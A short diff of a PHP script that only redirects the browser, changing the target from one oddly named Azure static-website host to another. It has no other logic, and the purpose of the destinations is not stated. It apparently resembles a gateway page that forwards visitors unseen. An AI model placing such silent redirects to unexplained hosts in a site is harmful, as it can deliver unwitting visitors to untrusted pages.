@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://capcorenewxxx.z8.web.core.windows.net/");
+header("Location: https://exitcoreweb.z29.web.core.windows.net/");
  
 exit;
 ?>
